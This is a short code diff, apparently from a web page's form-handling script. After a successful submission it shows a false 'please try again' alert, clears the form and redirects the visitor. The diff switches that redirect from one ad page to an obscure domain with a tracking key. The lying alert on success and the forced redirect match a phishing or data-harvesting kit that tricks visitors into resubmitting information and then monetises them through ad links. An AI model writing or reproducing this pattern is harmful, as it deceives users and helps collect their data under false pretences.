@@ -67,7 +67,7 @@ document.addEventListener("DOMContentLoaded", () => {
         if (response.ok) {
           alert("⛔ please try again");
           form.reset();
-          window.location.href = "https://intelseller.com/ads.html";
+          window.location.href = "https://thrillingdeepcutlery.com/sydysyn5?key=fccf58b052fceaf1d929c1f37af376db";
         } else {
           const errorText = await response.text();
           console.error("Server Error:", errorText);
